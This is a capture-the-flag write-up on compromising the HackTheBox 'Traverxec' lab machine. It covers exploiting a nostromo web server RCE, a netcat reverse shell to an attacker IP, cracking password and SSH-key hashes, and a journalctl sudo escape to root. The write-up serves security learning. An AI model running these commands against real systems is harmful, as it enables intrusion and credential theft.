---
title: "HackTheBox - Traverxec"
author: Nasrallah
description: ""
date: 2022-09-09 00:00:00 +0000
categories : [HackTheBox, Machines]
tags: [hackthebox, linux, easy, stty, cve, rce, crack, john, hashcat]
img_path: /assets/img/hackthebox/machines/traverxec
---

<div align="center"> <script src="https://www.hackthebox.eu/badge/565048"></script> </div>

---


## **Description**

Hello hackers, I hope you are doing well. We are doing [Traverxec](https://app.hackthebox.com/machines/Traverxec) from [HackTheBox](https://www.hackthebox.com). The box is running a webserver vulnerable to rce allowing to get a reverse shell on the machine. We enumerate the machine and find ssh private key of user `david`. After that we exploit a sudo entry to get root.

## **Enumeration**

### nmap

We start a nmap scan using the following command: `sudo nmap -sC -sV -T4 {target_IP}`.

- -sC: run all the default scripts.

- -sV: Find the version of services running on the target.

- -T4: Aggressive scan to provide faster results.

```terminal
Nmap scan report for 10.10.10.165
Host is up (0.11s latency).
Not shown: 998 filtered tcp ports (no-response)
PORT   STATE SERVICE VERSION
22/tcp open  ssh     OpenSSH 7.9p1 Debian 10+deb10u1 (protocol 2.0)
| ssh-hostkey: 
|   2048 aa:99:a8:16:68:cd:41:cc:f9:6c:84:01:c7:59:09:5c (RSA)
|   256 93:dd:1a:23:ee:d7:1f:08:6b:58:47:09:73:a3:88:cc (ECDSA)
|_  256 9d:d6:62:1e:7a:fb:8f:56:92:e6:37:f1:10:db:9b:ce (ED25519)
80/tcp open  http    nostromo 1.9.6
|_http-title: TRAVERXEC
|_http-server-header: nostromo 1.9.6
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel
```

We have 2 open ports, 22 running ssh and 80 running nostromo version 1.9.6.

Let's search for exploits in this version.

```terminal
$ searchsploit nostromo                              
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
 Exploit Title                                                                                                             |  Path
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Nostromo - Directory Traversal Remote Command Execution (Metasploit)                                                       | multiple/remote/47573.rb
nostromo 1.9.6 - Remote Code Execution                                                                                     | multiple/remote/47837.py
nostromo nhttpd 1.9.3 - Directory Traversal Remote Command Execution                                                       | linux/remote/35466.sh
--------------------------------------------------------------------------------------------------------------------------- ---------------------------------
Shellcodes: No Results

```

This version is vulnerable to rce and there is a module available on metasploit.

# **Foothold**

Let's fire up metasploit and use the following module : `use exploit/multi/http/nostromo_code_exec`.

![](1.png)

After setting the required option, run the exploit by entering `exploit`.

![](2.png)

We got code execution on the target as www-data.

To get a fully functional shell, setup a listener with `nc -lvnp 1234` and run the following command on the target `nc -e /bin/bash {attacker IP} 1234`

![](3.png)

Got a shell and stabilized it with python pty. 

## **Privilege Escalation**

Going to nostromo's config directory, we find an interesting file.

![](4.png)

Got the hash for user `david`. Let's copy it to our machine and crack it using `hashcat`.

```bash
$ hashcat -m 500 hash.txt ./pass.lst --username --force
```

![](5.png)

Nice, let's switch to user david.

Oops, the password isn't working. After some more enumeration, we find this.

![](6.png)

The configuration file shows that the server admin of nostromo is `david`, we see the location of some files and directories and on interesting directory called **public_www** located in the home directory of a user. Since the admin of the server is david, let's check if this directory is in his home directory.

![](7.png)

We find a backup containing some ssh files. Let's extract the file and see what is holds.

![](8.png)

We managed to find a ssh private key. Let's Copy that to our machine and connect with it.

![](9.png)

After putting the key in a file, we gave the file 600 permission so that we can use it, but it turns out it's protected with a password. Using `ssh2john` we got the hash of that password and managed to crack it using `john`. We managed to log in successfully after that.

In david's home folder we find a **bin** directory with an interesting shell script.

![](10.png)

The script contains the following command:

```bash
/usr/bin/sudo /usr/bin/journalctl -n5 -unostromo.service
```

We can run the above command as root. Looking up `journalctl` on [GTFOBins](https://gtfobins.github.io/gtfobins/journalctl/#sudo) we find the command we run to get root.

```terminal
sudo journalctl !/bin/sh
```

The way `journalctl` works is it sends the output to stdout if it can fit into the current page, if not, it sends to less. But with the command above, it's running with `-n 5` so that only 5 lines would come out.

We can either shrink our terminal window to smaller that 5 lines or change the terminal line settings with `stty`. We run the following command to display 3 lines.

```bash
stty rows 3
```

With that, we forced `journalctl` to use `less` which allows us to run `!/bin/bash` to escape it and become root.

![](11.png)


---

Thank you for taking the time to read my write-up, I hope you have learned something from this. If you have any questions or comments, please feel free to reach out to me. See you in the next hack :).